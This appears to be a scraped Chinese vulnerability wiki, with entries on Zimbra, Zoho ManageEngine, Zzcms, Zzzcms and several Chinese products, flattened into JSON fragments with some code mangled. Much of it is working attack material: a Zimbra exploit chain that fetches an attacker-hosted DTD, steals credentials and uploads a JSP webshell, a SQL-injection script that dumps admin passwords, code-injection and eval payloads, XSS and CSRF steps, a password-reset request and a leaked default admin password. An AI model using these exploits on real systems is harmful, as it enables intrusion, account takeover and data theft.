(CVE-2019-9670)Zimbra远程代码执行漏洞/media/rId34.png) 简易poc import requests file= { 'filename1':(None,\"whocare\",None), 'clientFile':(\"sunian.jsp\",r'\");while((a=in.read(b))!=-1){out.println(new String(b));}out.print(\"\");}%>',\"text/plain\"), 'requestId':(None,\"12\",None), } headers ={ \"Cookie\":\"ZM_ADMIN_AUTH_TOKEN=0_eb68a2a147c98c6d0c2257d7638c4f1256493b28_69643d33363a65306661666438392d313336302d313164392d383636312d3030306139356439386566323b6578703d31333a313539323733343831303035313b61646d696e3d313a313b747970653d363a7a696d6272613b7469643d393a3433323433373532323b\",#改成自己的admin_token \"Host\":\"foo:7071\" } r=requests.post(\"https://192.168.37.137:7071/service/extension/clientUploader/upload\",files=file,headers=headers,verify=False) print(r.text) (CVE-2019-9670)Zimbra远程代码执行漏洞/media/rId35.png) 虽然执行报错了，但是不影响> shell地址：https://www.0-sec.org:7071/downloads/sunian.jsp (CVE-2019-9670)Zimbra远程代码执行漏洞/media/rId36.png) 完整版exp (CVE-2019-9670)Zimbra远程代码执行漏洞/media/rId38.png) #coding=utf8 import requests import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning requests.packages.urllib3.disable_warnings(InsecureRequestWarning) base_url=sys.argv[1] base_url=base_url.rstrip(\"/\") #利用request模块来发包和接受数据，sys模块用来传参，并删除最右侧的/斜杠 filename = \"sunian.jsp\" fileContent = r'\");while((a=in.read(b))!=-1){out.println(new String(b));}out.print(\"\");}%>' #fileContent = r'[email protected]/* */ import=\"java.io.*\"%>[email protected]/* */ import=\"sun.misc.BASE64Decoder\"%>|\");int c;while ((c = in.read()) != -1) {out.print((char)c);}in.close();out.print(\"|' #可使用第11行bypass print(base_url) #请自己在公网放置dtd文件 dtd_url=\"http://VPS-IP/exp.dtd\" \"\"\" \"> \"> \"\"\" xxe_data = r\"\"\" %dtd; %all; ]> aaaaa &fileContents; \"\"\".format(dtd=dtd_url) #XXE stage headers = { \"Content-Type\":\"application/xml\" } print(\"[*] Get User Name/Password By XXE \") r = requests.post(base_url+\"/Autodiscover/Autodiscover.xml\",data=xxe_data,headers=headers,verify=False,timeout=15) #print r.text if 'response schema not available' not in r.text: print(\"don't have xxe\") exit() #low_token Stage import re pattern_name = re.compile(r\"\\n.*?(.*?)\") pattern_password = re.compile(r\"\\n.*?(.*?)\") username = pattern_name.findall(r.text)[0][2] password = pattern_password.findall(r.text)[0][2] #print(username) #print(password) auth_body=\"\"\" {username} {password} \"\"\" #print(\"[*] Get Low Privilege Auth Token\") #72行路径可能为/service/soap r=requests.post(base_url+\"/service/admin/soap\",data=auth_body.format(xmlns=\"urn:zimbraAccount\",username=username,password=password),verify=False) pattern_auth_token=re.compile(r\"(.*?)\") low_priv_token = pattern_auth_token.findall(r.text)[0] #print(low_priv_token) # SSRF+Get Admin_Token Stage headers[\"Cookie\"]=\"ZM_ADMIN_AUTH_TOKEN=\"+low_priv_token+\";\" headers[\"Host\"]=\"foo:7071\" #print(\"[*] Get Admin Auth Token By SSRF\") #r = requests.post(base_url+\"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap\",data=auth_body.format(xmlns=\"urn:zimbraAdmin\",username=username,password=password),headers=headers,verify=False) r = requests.post(base_url+\"/service/admin/soap\",data=auth_body.format(xmlns=\"urn:zimbraAdmin\",username=username,password=password),headers=headers,verify=False) #若86行无法使用请使用85行 admin_token =pattern_auth_token.findall(r.text)[0] #print(\"ADMIN_TOKEN:\"+admin_token) f = { 'filename1':(None,\"whocare\",None), 'clientFile':(filename,fileContent,\"text/plain\"), 'requestId':(None,\"12\",None), } headers ={ \"Cookie\":\"ZM_ADMIN_AUTH_TOKEN=\"+admin_token } print(\"[*] 木马地址\") r = requests.post(base_url+\"/service/extension/clientUploader/upload\",files=f,headers=headers,verify=False) #print(r.text) print(base_url+\"/downloads/\"+filename) #print(\"[*] Request Result:\") s = requests.session() r = s.get(base_url+\"/downloads/\"+filename,verify=False,headers=headers) #print(r.text) print(\"[*] 管理员cookie\") print(headers['Cookie']) 参考链接 https://www.cnblogs.com/dgjnszf/p/10793604.html https://xz.aliyun.com/t/7991\\#toc-1 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:23 "},"Web安全/Zoho ManageEngine/CVE-2020-10189 Zoho ManageEngine反序列化RCE/CVE-2020-10189 Zoho ManageEngine反序列化RCE.html":{"url":"Web安全/Zoho ManageEngine/CVE-2020-10189 Zoho ManageEngine反序列化RCE/CVE-2020-10189 Zoho ManageEngine反序列化RCE.html","title":"CVE-2020-10189 Zoho ManageEngine反序列化RCE","keywords":"","body":"CVE-2020-10189 Zoho ManageEngine反序列化RCE 漏洞描述 在3月6日，@steventseeley 在twitter上发布了关于 Zoho 企业产品 Zoho ManageEngine Desktop Central 中的反序列化远程代码执行漏洞。该产品是一款基于 Web 的企业级服务器、桌面机及移动设备管理软件，可对桌面机以及移动设备管理的整个生命周期提供完全的支持，提供软件分发、补丁管理、资产管理、系统配置、远程控制、USB 外设管理、移动设备及应用管理等功能模块，帮助 IT 管理员集中远程管理大量的 PC 和 IOS/Android/Windows 移动设备。 影响版本 Zoho ManageEngine Desktop Central 漏洞分析 本文使用10.0.465 x64复现分析，历史版本下载移步。 寻找反序列化点 首先反序列化漏洞，肯定需要先找到反序列化的点。 查看 DesktopCentral_ServerwebappsDesktopCentralWEB-INFweb.xml 发现了名为 CewolfServlet 的servlet，对应的类为 DesktopCentral_Serverlibcewolf-1.2.4.jar 中的 de.laures.cewolf.CewolfRenderer，对应的url为/cewolf/* CewolfRenderer 类继承 HttpServlet 是一个 servlet，在其 doGet 方法中 imgKey 可控，然后调用 storage.getChartImage(imgKey, request) 。Storage 类是一个接口，在这个jar包中，FileStorage 类实现了 Storage 接口的 getChartImage 方法。 很明显的看到直接将之前传入的 img 当作 imgKey 参数，然后通过 getFileName() 获取文件名然后进行 ObjectInputStream 的 readObject()，再看 getFileName()。 进行了一个简单的拼接，无伤大雅。 捋一下，通过img传入参数触发读文件进而反序列化，现在的问题就是这个恶意的序列化文件我们怎么传上去，并且路径要有_chart。 寻找上传点 web.xml中寻找上传的servlet 跟进之后发现udid、filename可控，并且udid被拼接到文件保存目录中。 String localDirToStore = baseDir + File.separator + \"mdm-logs\" + File.separator + this.customerID + File.separator + this.deviceName + \"_\" + udid; 那么我们可以跨目录上传，在上文中我们传入文件名触发反序列化时会拼接 this.basePath + \"_chart\" + id 到路径中，所以我们需要构造一个 _chart 的路径 aaa......webappsDesktopCentral_chart。 再来看对文件名的处理 然后文件名转小写之后进行了 FileUploadUtil.hasVulnerabilityInFileName(fileName, \"log|txt|zip|7z\") 的校验，然后拼接为完整的文件路径，看下校验了什么。 然后进行 isContainDirectoryTraversal() 、 isCompletePath() 、 isValidFileExtension() 的校验。 private static boolean isContainDirectoryTraversal(String fileName) { return fileName.contains(\"/\") || fileName.contains(\"\\\"); } private static boolean isCompletePath(String fileName) { String regexFileExtensionPattern = \"([a-zA-Z]:[\\ \\\\ / //].*)\"; Pattern pattern = Pattern.compile(regexFileExtensionPattern); Matcher matcher = pattern.matcher(fileName); return matcher.matches(); } private static boolean isContainExecutableFileExt(String fileName) { if (fileName.indexOf(\"u0000\") != -1) { fileName = fileName.substring(0, fileName.indexOf(\"u0000\")); } String fileExtension = FilenameUtils.getExtension(fileName).trim(); if (!fileExtension.trim().equals(\"\")) { fileExtension = fileExtension.toLowerCase(); ArrayList executableFileExts = new ArrayList(Arrays.asList(\"jsp\", \"js\", \"html\", \"htm\", \"shtml\", \"shtm\", \"hta\", \"asp\")); if (executableFileExts.contains(fileExtension)) { return true; } } return false; } 判断是否文件名进行了目录穿越、是否是合法后缀等，但是因为之前的目录是由udid控制的，并不影响我们的文件上传。而在web.xml中引入了security-mdm-agent.xml 在 security-mdm-agent.xml 中有一个校验，只允许文件名为 logger.txt|logger.zip|mdmlogs.zip|managedprofile_mdmlogs.zip 所以构造如下请求，即可上传文件 寻找gadgets DesktopCentral_Serverlib 中有 commons-collections.jar(3.1)、commons-beanutils-1.8.0.jar，完美。使用ysoserial生成序列化文件，先上传然后触发反序列化就完事了。注意ysoserial的pom.xml要和目标的jar版本一样。 漏洞修复 截至2020/03/20 9.34分，官网版本为10.0.515，已经修复了漏洞，请更新。 参考链接 https://srcincite.io/pocs/src-2020-0011.py.txt https://www.anquanke.com/post/id/200474 https://www.manageengine.com/products/desktop-central/remote-code-execution-vulnerability.html Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:26 "},"Web安全/Zzcms/（CVE-2018-13056）Zzcms 8.3 任意文件删除/（CVE-2018-13056）Zzcms 8.3 任意文件删除.html":{"url":"Web安全/Zzcms/（CVE-2018-13056）Zzcms 8.3 任意文件删除/（CVE-2018-13056）Zzcms 8.3 任意文件删除.html","title":"（CVE-2018-13056）Zzcms 8.3 任意文件删除","keywords":"","body":"（CVE-2018-13056）Zzcms 任意文件删除 一、漏洞简介 二、漏洞影响 版本：zzcms8.3 user / del.php 三、复现过程 Zzcms8.3任意文件删除/media/rId24.png) Zzcms8.3任意文件删除/media/rId25.png) 成功删除user / Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:31 "},"Web安全/Zzcms/（CVE-2018-14961）Zzcms 8.3 前台sql注入/（CVE-2018-14961）Zzcms 8.3 前台sql注入.html":{"url":"Web安全/Zzcms/（CVE-2018-14961）Zzcms 8.3 前台sql注入/（CVE-2018-14961）Zzcms 8.3 前台sql注入.html","title":"（CVE-2018-14961）Zzcms 8.3 前台sql注入","keywords":"","body":"（CVE-2018-14961）Zzcms 8.3 前台sql注入 一、漏洞简介 二、漏洞影响 Zzcms 8.3 三、复现过程 #!/usr/bin/env python #Author:Sublime #coding:utf-8 import requests as req url = \"http://0-sec.org:8080/dl/dl_sendmail.php\" cookies = {'UserName':'test','PassWord':'81dc9bdb52d04dc20036dbd8313ed055'} data = { 'sql':'select email from zzcms_dl where id=-1 union select pass from zzcms_admin #'} q = req.post(url,data,cookies=cookies,allow_redirects=False) print q.status_code print q.content 测试结果为： Zzcms8.3前台sql注入/media/rId24.png) 参考链接 https://www.anquanke.com/post/id/156660 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:32 "},"Web安全/Zzcms/（CVE-2018-14962）Zzcms 8.3 储存型xss/（CVE-2018-14962）Zzcms 8.3 储存型xss.html":{"url":"Web安全/Zzcms/（CVE-2018-14962）Zzcms 8.3 储存型xss/（CVE-2018-14962）Zzcms 8.3 储存型xss.html","title":"（CVE-2018-14962）Zzcms 8.3 储存型xss","keywords":"","body":"（CVE-2018-14962）Zzcms 8.3 储存型xss 一、漏洞简介 二、漏洞影响 Zzcms 8.3 三、复现过程 一个存储型xss，最底层的原因还是因为调用了stripfxg函数，消除了自己的过滤，然后在输出的时候，导致了xss漏洞。 Zzcms8.3储存型xss/media/rId24.png) 先看一下输出位置，在/zt/show.php 的211 行： Zzcms8.3储存型xss/media/rId25.png) 然后追踪这个变量的值，找到了是在用户在修改自己公司简介处添加的数据 然后我们来测试一下： Zzcms8.3储存型xss/media/rId26.png) 保存，然后访问一下/zt/show.php?id=1，就可以看到效果： Zzcms8.3储存型xss/media/rId27.png) 参考链接 https://www.anquanke.com/post/id/156660 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:33 "},"Web安全/Zzcms/（CVE-2018-14963）Zzcms 8.3 csrf/（CVE-2018-14963）Zzcms 8.3 csrf.html":{"url":"Web安全/Zzcms/（CVE-2018-14963）Zzcms 8.3 csrf/（CVE-2018-14963）Zzcms 8.3 csrf.html","title":"（CVE-2018-14963）Zzcms 8.3 csrf","keywords":"","body":"（CVE-2018-14963）Zzcms 8.3 csrf 一、漏洞简介 二、漏洞影响 Zzcms 8.3 三、复现过程 csrf漏洞，这个问题也是从上个版本就存在的问题，就是整个管理员后台的，所有表单都是没有设置csrf的token的，所以只要涉及到敏感操作的表单，都可以使用csrf来攻击，达成很多攻击利用。 这里的攻击是产生在了/admin/adminadd.php的添加管理员操作，构造的表单如下： history.pushState('', '', '/') 构造好了payload以后，放到vps上，然后诱导管理员点击恶意链接，即可成功添加管理员。 未添加管理员之前： Zzcms8.3csrf/media/rId24.png) 点击链接之后： Zzcms8.3csrf/media/rId25.png) 参考链接 https://www.anquanke.com/post/id/156660 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:35 "},"Web安全/Zzcms/Zzcms 2018 最新版重装getshell/Zzcms 2018 最新版重装getshell.html":{"url":"Web安全/Zzcms/Zzcms 2018 最新版重装getshell/Zzcms 2018 最新版重装getshell.html","title":"Zzcms 2018 最新版重装getshell","keywords":"","body":"Zzcms 2018 最新版重装getshell 一、漏洞简介 源码信息：Zzcms 2018 问题文件： \\zzcms\\install\\index.php 漏洞类型：重装getshell 站点地址：http://www.zzcms.net/ 二、漏洞影响 Zzcms2018 三、复现过程 0x01攻击分析 在文件\\ zzcms \\ install \\ index.php文件的第9-10行中$ _POST使用了提取变量注册的方法进行变量的初始化。 if($_POST) extract($_POST, EXTR_SKIP);//把数组中的键名直接注册为了变量。就像把$_POST[ai]直接注册为了$ai。 if($_GET) extract($_GET, EXTR_SKIP); $submit = isset($_POST['submit']) ? true : false; $step = isset($_POST['step']) ? $_POST['step'] : 1; 分析代码可以知道，setp为空的时候，初始化初始化的变量1，然后进入到step_1.php，有install.lock，就不能重装，所以我们这里直接POST step = 2绕过 alert(\"'.$msg.'\");window.history.back();'; exit; } $conn=connect($db_host,$db_user,$db_pass,'',$db_port); if(!$conn) dexit('无法连接到数据库服务器，请检查配置'); $db_name or dexit('请填写数据库名'); if(!select_db($db_name)) { if(!query(\"CREATE DATABASE $db_name\")) dexit('指定的数据库不存在\\n\\n系统尝试创建失败，请通过其他方式建立数据库'); } $url=str_replace(\"'\",'',$url); //保存配置文件 $fp=\"../inc/config.php\"; $f = fopen($fp,'r'); $str = fread($f,filesize($fp)); fclose($f); $str=str_replace(\"define('sqlhost','\".sqlhost.\"')\",\"define('sqlhost','$db_host')\",$str) ; $str=str_replace(\"define('sqlport','\".sqlport.\"')\",\"define('sqlport','$db_port')\",$str) ; $str=str_replace(\"define('sqldb','\".sqldb.\"')\",\"define('sqldb','$db_name')\",$str) ; $str=str_replace(\"define('sqluser','\".sqluser.\"')\",\"define('sqluser','$db_user')\",$str) ; $str=str_replace(\"define('sqlpwd','\".sqlpwd.\"')\",\"define('sqlpwd','$db_pass')\",$str) ; $str=str_replace(\"define('siteurl','\".siteurl.\"')\",\"define('siteurl','$url')\",$str) ; $str=str_replace(\"define('logourl','\".logourl.\"')\",\"define('logourl','$url/image/logo.png')\",$str) ; $f=fopen($fp,\"w+\");//fopen()的其它开关请参看相关函数 fputs($f,$str);//把替换后的内容写入文件 fclose($f); //创建数据 include 'step_'.$step.'.php'; break; case '6'://安装成功 include 'step_'.$step.'.php'; break; } step_3.php文件中有一个创建的令牌，后面创建数据库的时候验证，所以从步骤= 2，一步一步偶。 从上面的代码文中知道$ url = str_replace（\"\\'\"，\"，$ url）; 把单引号替换为空了，然后的fputs写INC / config.php的配置文件中所以这里通过$ DB_NAME来写到配置文件。 0×02复漏洞现 在数据库配置页面，数据库名填写： zzcms%27%29%3bphpinfo%28%29%3b%2f%2f 本机创建zzcms\\');phpinfo();//的数据库 因为本地有JS验证，所以先把数据库名改成123，bp抓到包以后在修改成zzcms%27%29%3bphpinfo%28%29%3b%2f%2f 成功写入到配置文件 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:30 "},"Web安全/Zzcms/Zzcms 8.2 任意用户密码修改/Zzcms 8.2 任意用户密码修改.html":{"url":"Web安全/Zzcms/Zzcms 8.2 任意用户密码修改/Zzcms 8.2 任意用户密码修改.html","title":"Zzcms 8.2 任意用户密码修改","keywords":"","body":"Zzcms 8.2 任意用户密码修改 一、漏洞简介 Zzcms是一款企业建站程序。 zzcms 8.2版本/one/getpassword.php文件存在漏洞，攻击者可利用该漏洞修改任意用户密码。 二、漏洞影响 Zzcms 8.2 三、复现过程 漏洞分析 /one/getpassword.php文件第 73行，触发漏洞的关键代码。 }elseif($action==\"step3\" && @$_SESSION['username']!=''){ $passwordtrue = isset($_POST['password'])?$_POST['password']:\"\"; $password=md5(trim($passwordtrue)); query(\"update zzcms_user set password='$password',passwordtrue='$passwordtrue' where username='\".@$_SESSION['username $strout=str_replace(\"{step4}\",\"\",$strout) ; $strout=str_replace(\"{/step4}\",\"\",$strout) ; $strout=str_replace(\"{step1}\".$step1.\"{/step1}\",\"\",$strout) ; $strout=str_replace(\"{step2}\".$step2.\"{/step2}\",\"\",$strout) ; $strout=str_replace(\"{step3}\".$step3.\"{/step3}\",\"\",$strout) ; $strout=str_replace(\"{#username}\",@$_SESSION['username'],$strout) ; 这里仅仅判断了 action参数为 step3，并且$_SESSION[\\'username\\']不为空，就进入密码修改的逻辑，直接执 行sql语句执行update操作。那么这里的$_SESSION[\\'username\\']从哪里来的，我们继续看代码，在 /one/getpassword.php文件第 31行，可以看到 $_SESSION['username']。 if ($action==\"step1\"){ $username = isset($_POST['username'])?$_POST['username']:\"\"; $_SESSION['username']=$username; checkyzm($_POST[\"yzm\"]); $rs=query(\"select mobile,email from zzcms_user where username='\" . $username . \"' \"); $row=fetch_array($rs); $regmobile=$row['mobile']; $regmobile_show=str_replace(substr($regmobile,3,4),\"****\",$regmobile); $regemail=$row['email']; $regemail_show=str_replace(substr($regemail,1,2),\"**\",$regemail); 这里username是从step1不做中 post传递过来的 username参数，也就是我们要修改的用户名。那么漏洞就很 明显了，在第一步输入要修改的用户名，然后获取session值，直接跳到第三步，修改密码就可以打到任意 用户密码修改。 漏洞复现 第一步先在找回密码页面输入要修改的用户名，点击下一步，burp拦截。 抓包获取session值 这里我们获取到了 session值，然后根据上面的描述，修改数据包，直接进入修改密码操作。 这里session就是上面获取到的，只需要修改 post-data值就可以。这里改成mima888。action值要改成step3 才可以进去 数据库 update语句的操作。然后重放数据包，就可以完成任意密码修改了。 前台登录试试，是否修改成功。 成功修改密码，登录成功。 利用此漏洞，只需 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:28 "},"Web安全/Zzzcms/Zzzcms 1.61 后台远程命令执行漏洞/Zzzcms 1.61 后台远程命令执行漏洞.html":{"url":"Web安全/Zzzcms/Zzzcms 1.61 后台远程命令执行漏洞/Zzzcms 1.61 后台远程命令执行漏洞.html","title":"Zzzcms 1.61 后台远程命令执行漏洞","keywords":"","body":"Zzzcms 1.61 后台远程命令执行漏洞 一、漏洞简介 zzzphp cms ，远程代码执行漏洞存在的主要原因是页面对模块的php代码过滤不严谨，导致在后台可以写入php代码从而造成代码执行。 二、漏洞影响 Zzzcms 1.61 三、复现过程 漏洞分析 打开/search/index.php require dirname(dirname(__FILE__)). '/inc/zzz_client.php'; 发现是跳到/inc/zzz_client.php，那么我们就来到/inc/zzz_client.php 发现解析模块是通过ParsetTemplate来解析的，那么我们找到ParserTemplate类的php文件zzz_template.php。在zzz_template.php中我们发现一个IF语句 $zcontent = $this->parserIfLabel( $zcontent ); // IF语句 那么我们来到zzz_template.php中对parserIfLabel的定义 发现$ifstr 经过一连串的花里胡哨的过滤最后进了evel函数，然后使用了evel函数执行，最后造成了本次远程代码执行漏洞。 漏洞复现 在后台模块管理中的电脑模块找到cn2016 然后在cn2016文件中到html文件，然后在html文件中找到search.html，然后将其的代码修改为 {if:assert($_request[phpinfo()])}phpinfo();{end if} 然后打开http://xxxx.com/zzzcms/search/就可以看到我们刚刚输入的phpinfo()执行了。 参考链接 https://xz.aliyun.com/t/4471 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:36 "},"Web安全/Zzzcms/Zzzcms 1.75 ssrf/Zzzcms 1.75 ssrf.html":{"url":"Web安全/Zzzcms/Zzzcms 1.75 ssrf/Zzzcms 1.75 ssrf.html","title":"Zzzcms 1.75 ssrf","keywords":"","body":"Zzzcms 1.75 ssrf 一、漏洞简介 存在这个问题的接口主要功能是远程下载保存图片，但是后缀限制死了，因此远程下载webshell的目的应该是达不到了，退而求其次也可以作为SSRF利用，比如需要获取目标主机的真实IP地址的场景下。 二、漏洞影响 Zzzcms 1.75 三、复现过程 漏洞分析 功能实现在 plugins/ueditor/php/controller.php 传入的post参数进入safe_url函数进行处理，然后传入down_url函数。这里safe_url函数作用不大，主要是在down_url中的逻辑。 在down_url函数逻辑中根据url获取了保存的文件名和后缀，并且进行了文件名后缀的白名单限制和检测。 最后通过readfile进行远程资源获取（本地也可以，支持file协议），这里通过file_ext函数传入http://XXXX/x.php?x.jpg得到的文件名后缀仍然是php，对问号进行了处理，因此利用SSRF达到任意地址访问需要利用301/302跳转实现，本地搭建一个提供跳转的http服务器，然后进行访问： from flask import Flask,redirect,request app = Flask(__name__) @app.route('/1.txt') def index(page_name=''): #return redirect('file:///etc/passwd', code=301) #not work return redirect('http://www.net.cn/static/customercare/yourip.asp', code=301) if __name__ == '__main__': app.run(host='0.0.0.0', port=9000, debug=app.debug) 参考链接 https://xz.aliyun.com/t/7414 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:38 "},"Web安全/Zzzcms/Zzzcms 1.75 xss漏洞/Zzzcms 1.75 xss漏洞.html":{"url":"Web安全/Zzzcms/Zzzcms 1.75 xss漏洞/Zzzcms 1.75 xss漏洞.html","title":"Zzzcms 1.75 xss漏洞","keywords":"","body":"Zzzcms 1.75 xss漏洞 一、漏洞简介 二、漏洞影响 Zzzcms 1.75 三、复现过程 http://www.0-sec.org/plugins/template/login.php?backurl=1%20onmouseover%3dalert(9516)%20y%3d 该onmouseover事件在移动到登录注册时会触发 对传入的backurl并没有做任何防护 image Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:39 "},"Web安全/Zzzcms/Zzzcms 1.75 前台sql注入/Zzzcms 1.75 前台sql注入.html":{"url":"Web安全/Zzzcms/Zzzcms 1.75 前台sql注入/Zzzcms 1.75 前台sql注入.html","title":"Zzzcms 1.75 前台sql注入","keywords":"","body":"Zzzcms 1.75 前台sql注入 一、漏洞简介 二、漏洞影响 Zzzcms 1.75 三、复现过程 注入点的入口在plugins\\sms\\sms_list.php文件中， 其中id参数是用户post输入的参数，并且在第7行中调用了db_delete去删除指定id的数据，进入db_delete函数后可以看到函数本身并不长，逻辑还是较为清晰的。 在获取到代表着数据库连接的$d后开始处理传入的$where条件变量，接着调用db_cond_to_sqladd函数后传入db_exec进行sql语句的执行过程。 这里继续看db_cond_to_sqladd函数部分，该函数代码部分比较长（70行），但只需要着重看其中几个处理分支即可。注入点传入的条件变量是数组，自然进入下面的第一个红框控制流中。接着，假如传入的参数id也是数组并且不存在key为0的元素，那么会进入第二个红框控制流中。 关键点在于第三个红框的控制流中，作为键名key的$k1直接拼接到了条件语句中。 在代码中加入sql语句回显进行测试，当我们传入如下post的id后，返回的sql语句如下所示，已经形成可以利用的SQL注入点了： 利用BENCHMARK函数可以直接构造exp利用时间盲注得到数据库信息。 参考链接 https://xz.aliyun.com/t/7414 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:40 "},"Web安全/Zzzcms/Zzzcms 1.75 后台任意文件读取/Zzzcms 1.75 后台任意文件读取.html":{"url":"Web安全/Zzzcms/Zzzcms 1.75 后台任意文件读取/Zzzcms 1.75 后台任意文件读取.html","title":"Zzzcms 1.75 后台任意文件读取","keywords":"","body":"Zzzcms 1.75 后台任意文件读取 一、漏洞简介 管理员权限 后台管理目录 后台数据库为mysql 二、漏洞影响 Zzzcms 1.75 三、复现过程 任意文件读取（一） 首先来看防护规则，不允许出现./ 看 safe_path 只能是upload template runtime路径下的 所以构造/runtime/..\\config/zzz_config.php 即可绕过防护 任意文件读取（二） 首先来看restore函数，mysql数据库，发现path是可控的，看955行，跟进到load_file函数 在zzz_file.php文件中，如果存在该path,则通过file_get_contents读取 然后现在的想法是如何输入出来，跟进到db_exec()函数 在zzz_db.php中，看str_log把sql语句写入到了log中 在zzz.file.php中，跟进到str_log文件，看到文件的命名规则， 文件命名规则为当天时间的时间戳+数据库用户+数据库密码，并且是未授权访问 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:42 "},"Web安全/Zzzcms/Zzzcms 1.75 后台地址泄露/Zzzcms 1.75 后台地址泄露.html":{"url":"Web安全/Zzzcms/Zzzcms 1.75 后台地址泄露/Zzzcms 1.75 后台地址泄露.html","title":"Zzzcms 1.75 后台地址泄露","keywords":"","body":"Zzzcms 1.75 后台地址泄露 一、漏洞简介 二、漏洞影响 Zzzcms 1.75 三、复现过程 存在一个比较奇葩的文件直接将一些属于不可访问的zzz_config.php的内容直接给回显了，该信息泄露文件位于plugins\\webuploader\\js\\webconfig.php，可以直接获取到管理后台的管理路径名称，再也不用去爆破admin加3位数字了 参考链接 https://xz.aliyun.com/t/7414 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:44 "},"Web安全/中安网脉-高级威胁检测系统/中安网脉-高级威胁检测系统/中安网脉-高级威胁检测系统.html":{"url":"Web安全/中安网脉-高级威胁检测系统/中安网脉-高级威胁检测系统/中安网脉-高级威胁检测系统.html","title":"中安网脉-高级威胁检测系统","keywords":"","body":"中安网脉-高级威胁检测系统鸡肋的信息泄露 漏洞描述 中安网脉APT高级持续性威胁检测系统存在一个比较鸡肋的信息泄露，可以看到其设备内部所有的漏洞信息，可能队友竞品有一些作用。 漏洞影响 中安网脉APT高级持续性威胁检测系统 FOFA ''威胁检测系统'' && title=\"高级威胁检测系统\" 漏洞复现 登录页面如下： 漏洞URL： /atd-translation/i18n.json 这个以后有时间了可以深度挖掘一下，注册资金7000W+ 需要证书的小伙伴可以提前深入一下。 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:46 "},"Web安全/中庆纳博某系统/中庆纳博某系统敏感信息泄露和未授权漏洞/中庆纳博某系统敏感信息泄露和未授权漏洞.html":{"url":"Web安全/中庆纳博某系统/中庆纳博某系统敏感信息泄露和未授权漏洞/中庆纳博某系统敏感信息泄露和未授权漏洞.html","title":"中庆纳博某系统敏感信息泄露和未授权漏洞","keywords":"","body":"中庆纳博某系统敏感信息泄露+未授权漏洞 漏洞描述 北京中庆纳博信息技术有限公司，简称中庆纳博，是有20年历史的中庆集团旗下核心企业，专注于教育信息化的深度应用领域。产品以教育软件为主，核心产品为“中庆教育云”平台。公司成立三年多来，客户已遍及全国各地，“中庆教育云”亦成为业内的知名品牌，该系统api接口存在信息泄露，并且可以进行任意密码重置。 漏洞影响 中庆纳博 FOFA \"中庆纳博\" 漏洞复现 登录页面如下： 通过访问url可以获取账号等敏感信息： /api/TeacherQuery/SearchTeacherInSiteWithPagerRecords 获取到账号以后，可以进行密码重置，默认密码为123456，payload： POST /api/User/ResetPassword HTTP/1.1 Host: xxxxxxxxxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0 Accept: application/json, text/plain, / Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-Type: application/json;charset=utf-8 Content-Length: 23 Origin: http://117.36.154.34:8010 DNT: 1 Connection: close Referer: http://xxxxxxxx/default/admin/user/index{\"loginName\":\"admin\"}也可以通过 id删除账户 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:12:48 "},"Web安全/中新金盾/中新金盾信息安全管理系统 默认超级管理员密码漏洞/中新金盾信息安全管理系统 默认超级管理员密码漏洞.html":{"url":"Web安全/中新金盾/中新金盾信息安全管理系统 默认超级管理员密码漏洞/中新金盾信息安全管理系统 默认超级管理员密码漏洞.html","title":"中新金盾信息安全管理系统 默认超级管理员密码漏洞","keywords":"","body":"中新金盾信息安全管理系统 默认超级管理员密码漏洞 漏洞描述 中新网络信息安全股份有限公司中新金盾信息安全管理系统存在默认弱口令，登录身份为超级管理员 目前大部分使用的都受到了影响 漏洞影响 中新金盾信息安全管理系统 FOFA title=\"中新金盾信息安全管理系统\" 漏洞复现 看到产品手册 系统默认管理员账号密码： admin/zxsoft1234!@#$ 登录页面如上，使用账号密码登录 其中泄露了大部分信息，其中包括 SMMS与FTP 及用户信息 漏洞利用POC 请求 ?q=common/getcode 时 返回了验证码，通过验证码可爆破账号密码等操作 import requests import sys import random import re import base64 import time from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: 中新金盾信息安全管理系统 默认超级管理员密码漏洞 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"?q=common/getcode\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] 正在获取验证码 {}?q=common/getcode ..... \\033[0m\".format(target_url)) response_data = response.headers['Set-Cookie'] check_code = re.findall(r'check_code=(.*?);', response_data)[0] PHPSESSID = re.findall(r'PHPSESSID=(.*?);', response_data)[0] print(\"\\033[36m[o] 验证码:{}\\n[o] PHPSESSID:{} \\033[0m\".format(check_code, PHPSESSID)) 